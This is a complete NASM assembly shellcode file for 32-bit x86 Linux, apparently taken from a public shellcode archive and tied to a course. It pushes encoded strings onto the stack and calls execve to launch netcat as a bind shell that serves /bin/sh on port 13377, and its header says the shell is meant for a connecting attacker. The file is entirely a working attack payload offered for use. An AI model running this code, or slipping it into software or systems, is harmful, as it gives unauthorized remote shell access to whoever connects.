; From: http://shell-storm.org/shellcode/files/shellcode-804.php
; Filename: shellcode2.nasm
; Author:  SLAE-935
;
; Purpose: This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker

section .text

    global _start
 
_start:
    xor eax,eax
    xor edx,edx
    push 0x37373333
    push 0x3170762d
    mov edx, esp
    push eax
    push 0x68732f6e
    push 0x69622f65
    push 0x76766c2d
    mov ecx,esp
    push eax
    push 0x636e2f2f
    push 0x2f2f2f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push edx
    push ecx
    push ebx
    xor edx,edx
    mov  ecx,esp
    mov al,11
    int 0x80